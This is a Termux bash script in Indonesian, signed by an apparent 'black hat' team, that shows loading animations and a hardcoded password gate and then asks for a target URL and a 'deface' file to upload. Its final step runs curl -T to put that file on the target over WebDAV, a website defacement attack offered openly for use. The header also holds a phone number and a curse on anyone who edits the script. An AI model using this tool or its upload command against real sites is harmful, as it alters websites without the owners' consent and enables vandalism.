# ngapain Lu Kesini
# Mau Recode Ya
# Izin Ke Gw +6285707745526
# klo Lu Ga Izin Ke Gw,Gw Doain Lu Mati Konyol Sama Masuk Neraka Jahanam Amin!!!
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red='\33[31;1m'
purple="\033[37;1m"
cyan="\033[36;1m"
clear
echo
echo
echo
echo  $indigo
echo "▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...";
sleep 0.7;
clear
echo  $green
echo "▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...";
sleep 0.7;
clear
echo  $red
echo '▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...';
sleep 0.7;
clear
echo  $cyan
echo "▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒Loading ...";
sleep 0.7;
clear
echo  $green
echo  '▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...';
sleep 0.7;
clear
echo  $yellow
echo '▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...';
sleep 0.7;
clear
echo  $red
echo '▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...';
sleep 0.7;
clear
echo  $green
echo "▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...";
sleep 0.7;
clear
echo  $indigo
echo '▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...';
sleep 0.7;
clear
echo  $red
echo '▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...';
sleep 0.7;
clear
echo  $green
echo "▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...";
sleep 0.7;
clear
echo $red
echo '▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...';
sleep 0.7;
clear
echo $green
echo "▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...";
sleep 0.7;clear
echo $cyan
echo '▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...';
sleep 0.7;
clear
echo $yellow
echo "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...";
sleep 0.7;
clear
echo $green
echo "Loading succes";
sleep 4
clear
figlet termux security | lolcat
echo "=======================================" | lolcat
echo "[+]       Author : MR.P5159C         [+]" | lolcat
echo "[+]      Team : black hat jombang    [+]" | lolcat
echo "[+]      Facebook : gak tau          [+]" | lolcat
echo "========================================" | lolcat

        read -p "username :" user;
        read -p "password :" pass;
#kondisi
echo
echo

if [ $pass = "Mr.P5159C" ]
         then
         echo
        echo $green
         echo  "Access Grented"
          sleep 2
         else
         echo $red
          echo  "Access Denied"
           sleep 2
         sh Deface.sh



sleep 3

clear
fi
clear
read -p "username :" user;
#kondisi
echo
echo

if [ $user = "Jombangjatim" ]
         then
         echo

          echo $green "Access Grented"
          sleep 2
         else
          echo $red
          echo "Access Denied"
           sleep 2
         sh Deface.sh


sleep 3
fi
clear
read -p "nama lu :" nama
echo $red "selamat datang $nama jangan di salah gunain ya"
sleep 3
clear
echo $red "klo lu salah gunain gw doain lu masuk neraka jahanam amin!!!"
sleep 3


clear
figlet webdav | lolcat
echo "=======================================" | lolcat
echo "[+]       Author : MR.P5159C         [+]" | lolcat
echo "[+]      Team : black hat jombang    [+]" | lolcat
echo "[+]      Facebook : gak tau          [+]" | lolcat
echo "========================================" | lolcat
echo ""
echo $red "script harus di luar memori intrenal"
read -p "Mana Target Mu :" Target;
read -p "Script Deface Mu :" Script;
sleep 4
echo $green"Tunggu Saya lagi Berusaha..........."
sleep 2
termux-setup-storage
curl -T /storage/emulated/0/$Script  $Target
echo $green "succes"
